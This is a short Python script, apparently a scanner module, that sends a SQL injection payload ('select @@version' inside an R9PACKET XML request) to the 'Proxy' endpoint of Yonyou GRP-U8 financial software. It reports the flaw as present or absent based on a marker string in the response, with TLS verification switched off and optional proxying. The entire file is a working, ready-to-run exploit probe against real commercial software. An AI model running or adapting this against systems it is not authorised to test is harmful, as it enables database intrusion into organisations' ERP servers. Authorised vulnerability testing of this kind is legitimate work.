import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/4.0(compatible;MSIE6.0;)"
        }
        data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
        logging.captureWarnings(True)
        gf = requests.post(url + "Proxy",data=data,cookies=s_cookie, headers=header,proxies=proxies, verify=False)
        gf.encoding = 'utf-8'
        if "00E3B938F994E07B" in gf.text:
            uia = '[+]漏洞存在\n'+str(gf.text)
        else:
            uia = "[-]漏洞不存在"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 用友 GRP-U8 Proxy SQL注入 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)